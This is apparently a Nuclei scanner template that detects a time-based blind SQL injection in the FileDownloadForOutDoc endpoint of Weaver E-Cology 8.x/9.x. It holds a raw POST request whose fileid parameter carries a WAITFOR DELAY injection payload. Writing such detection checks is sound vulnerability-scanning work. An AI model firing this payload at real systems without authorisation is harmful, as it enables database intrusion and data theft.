id: ecology_sqli_2023_filedownloadforoutdoc-sqli

info:
  name: 泛微 E-Cology 9.X SQL注入漏洞
  author: pork
  severity: critical
  description: 泛微 E-Cology 8.X,9.X(补丁版本 < 10.58.0) filedownloadforoutdoc接口存在SQL注入漏洞，攻击者可利用此漏洞进行SQL盲注，获取数据库敏感信息。
  tags: ecology,weaver,sqli,oa

requests:
  - raw:
      - |
        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close        

        fileid=2+WAITFOR DELAY+'0:0:5'&isFromOutImg=1
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'

